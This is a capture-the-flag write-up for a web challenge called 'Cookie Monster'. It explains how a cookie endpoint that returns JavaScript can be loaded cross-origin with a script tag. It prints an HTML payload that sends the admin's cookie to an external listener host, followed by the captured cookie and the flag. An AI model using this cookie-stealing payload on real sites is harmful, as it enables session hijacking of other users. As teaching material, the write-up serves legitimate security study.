# Cookie Monster
Web (170 points, 21 solves)

## Challenge 

My friend sent me this [monster](https://files.actf.co/ff3493399d3dce8d395ccc323ba410f449d628bc10f664282dbbfa3522b7226e/cookie_monster.js) of a [website](https://cookiemonster.2019.chall.actf.co/) - maybe you can figure out what it's doing? I heard the admin here is slightly more cooperative than the other one, though not by much.

Author: lamchcl

## Solution

Note: I did not solve this during the contest. 

Looking at the website, this looks like another XSS problem. We can send the admin a page and he/she will look at it. But where can we inject code? There is no input anywhere?

The source code tells us the answer. We can get cookies from `/cookies`. This is important because this lets us get cookies from another domain, something which usually prevents this kind of attack. Unfortunately, cross origin access is still blocked.

But wait! `<script>` tags don't get blocked by CORS, and since the output of `/cookies` is valid JavaScript, we can just include it as a script! 

I used [Weastie Hack Tools](https://www.weastie.com/hack_tools) [HTTP Request Listener](https://www.weastie.com/hack_tools/listener) along with [HTML Uploader](https://www.weastie.com/hack_tools/html) to serve this HTML:

```html
<script src="https://cookiemonster.2019.chall.actf.co/cookies"></script>
<script>
   var xml = new XMLHttpRequest();
   xml.open('GET', "//weastie.com/l/gah7/" + encodeURIComponent(Object.keys(window)));
   xml.send();
</script>
```

We get our cookie `admin_FtiwZurLxCv7lweCChF_YQLkJ5n3LgfM86ACY_YPh1Y=`. Accessing `/getflag` with this cookie gives us our flag. 

## Flag

```
actf{defund_is_the_real_cookie_monster}
```
